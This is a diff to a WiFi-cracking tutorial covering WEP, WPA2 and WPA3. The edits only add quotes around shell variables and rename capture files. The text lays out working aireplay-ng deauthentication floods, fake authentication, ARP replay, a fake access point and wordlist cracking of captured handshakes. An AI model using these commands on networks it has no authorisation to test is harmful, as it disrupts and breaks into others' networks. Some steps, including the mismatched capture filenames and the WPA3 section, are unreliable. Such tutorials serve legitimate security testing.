@@ -37,7 +37,7 @@ it to monitor mode using the following commands :
 ```bash
 sudo airmon-ng check kill
 interface="wlo1"
-sudo airmon-ng start ${interface}  # start monitor mode
+sudo airmon-ng start "${interface}"  # start monitor mode
 interface="${interface}mon"
 ```
 
@@ -46,13 +46,13 @@ interface="${interface}mon"
 Now, you can scan for wifi networks using the following command:
 
 ```bash
-sudo airodump-ng ${interface}
+sudo airodump-ng "${interface}"
 ```
 
 or
 
 ```bash
-sudo airodump-ng ${interface} --essid "MyNetworkName"
+sudo airodump-ng "${interface}" --essid "MyNetworkName"
 ```
 
 This will display a list of all the wifi networks in range, and note the BSSID
@@ -71,7 +71,7 @@ To crack WEP, you need to capture packets from the target network. You can do
 this using the following command:
 
 ```bash
-sudo airodump-ng --channel $channel --bssid $bssid --write outputdump $interface
+sudo airodump-ng --channel "$channel" --bssid "$bssid" --write outputdump "$interface"
 ```
 
 You want a lot of Data packets (not just Beacons).
@@ -82,14 +82,14 @@ To speed up the process, you can use the following command to inject packets
 into the network:
 
 ```bash
-sudo aireplay-ng --fakeauth 0 -a $bssid $interface
+sudo aireplay-ng --fakeauth 0 -a "$bssid" "$interface"
 ```
 
 This will authenticate you to the network and allow you to capture more packets,
 then you can use the following command to generate ARP requests:
 
 ```bash
-sudo aireplay-ng --arpreplay -b $bssid $interface
+sudo aireplay-ng --arpreplay -b "$bssid" "$interface"
 ```
 
 This will generate a lot of traffic and help you capture more packets.
@@ -115,7 +115,7 @@ capture the handshake when a client connects to the network, so start the
 airodump-ng command to capture packets:
 
 ```bash
-sudo airodump-ng --channel $channel --bssid $bssid --write out $interface
+sudo airodump-ng --channel "$channel" --bssid "$bssid" --write out "$interface"
 ```
 
 If a client is connected to the network, you will see the handshake in the
@@ -123,16 +123,16 @@ terminal. If not, you can use the following command to deauthenticate a client
 and force it to reconnect in another terminal:
 
 ```bash
-sudo aireplay-ng --deauth 10 -a $bssid $interface
+sudo aireplay-ng --deauth 10 -a "$bssid" "$interface"
 # or
-sudo aireplay-ng --deauth 10 -a $bssid -c $station $interface
+sudo aireplay-ng --deauth 10 -a "$bssid" -c "$station" "$interface"
 ```
 
 Once you have captured the handshake, you can crack the WPA/WPA2 key using a
 wordlist. You can use the following command to crack the key:
 
 ```bash
-aircrack-ng -w <wordlist> <capture_file>
+aircrack-ng -w <wordlist> capture.pcap
 ```
 
 This will attempt to crack the WPA/WPA2 key using the wordlist provided. If
@@ -165,7 +165,7 @@ Thus, you can use the following command:
 
 ```bash
 band="a" # or b,c
-sudo hcxdumptool -i $interface -c ${channel}$band --bpf=output.bpf -w output.pcapng
+sudo hcxdumptool -i "$interface" -c "$channel$band" --bpf=output.bpf -w output.pcapng
 ```
 
 This will create a pcapng file with the captured packets, you need to wait for
@@ -178,9 +178,9 @@ reconnect in another terminal:
 
 ```bash
 # To broadcast:
-sudo aireplay-ng --deauth 0 -a $bssid $interface
+sudo aireplay-ng --deauth 0 -a "$bssid" "$interface"
 # or
-sudo aireplay-ng --deauth 0 -a $bssid -c $station $interface
+sudo aireplay-ng --deauth 0 -a "$bssid" -c "$station" "$interface"
 ```
 
 Now, we need to convert the pcapng file to the specific hash that `hashcat` can
@@ -211,7 +211,7 @@ To crack WPA3, you need to capture packets from the target network. You can do
 this using the following command:
 
 ```bash
-sudo airodump-ng --channel $channel --bssid $bssid $interface
+sudo airodump-ng --channel "$channel" --bssid "$bssid" "$interface"
 ```
 
 ### Deauthenticate a client
@@ -220,9 +220,9 @@ To deauthenticate a client and force it to reconnect, you can use the following
 command:
 
 ```bash
-sudo aireplay-ng --deauth 0 -a $bssid $interface
+sudo aireplay-ng --deauth 0 -a "$bssid" "$interface"
 # or
-sudo aireplay-ng --deauth 0 -a $bssid -c $station $interface
+sudo aireplay-ng --deauth 0 -a "$bssid" -c "$station" "$interface"
 ```
 
 ### Fake a WPA2 AP
@@ -230,7 +230,7 @@ sudo aireplay-ng --deauth 0 -a $bssid -c $station $interface
 To fake a WPA2 AP, you can use the following command:
 
 ```bash
-sudo airbase-ng -e $ssid -c $channel -P -C 30 -Z 4 $interface
+sudo airbase-ng -e "$ssid" -c "$channel" -P -C 30 -Z 4 "$interface"
 ```
 
 This will create a fake AP with the specified SSID and channel, however, this is
@@ -241,14 +241,14 @@ WPA3 cracking work.
 Conceal the WPA3 handshake by capturing it with airodump-ng:
 
 ```bash
-sudo airodump-ng --channel $channel --bssid $fake_bssid --write out $interface
+sudo airodump-ng --channel "$channel" --bssid "$fake_bssid" --write out "$interface"
 ```
 
 Once you have captured the handshake, you can crack the WPA3 key using a
 wordlist. You can use the following command to crack the key:
 
 ```bash
-aircrack-ng -w $wordlist out
+aircrack-ng -w "$wordlist" output.pcap
 ```
 
 This will attempt to crack the WPA3 key using the wordlist provided. If
@@ -260,7 +260,7 @@ Once you are done with the cracking, you can reset your wifi interface to its
 normal mode using the following command:
 
 ```bash
-sudo airmon-ng stop $interface
+sudo airmon-ng stop "$interface"
 ```
 
 This will stop the monitor mode and reset the interface to its normal mode. You
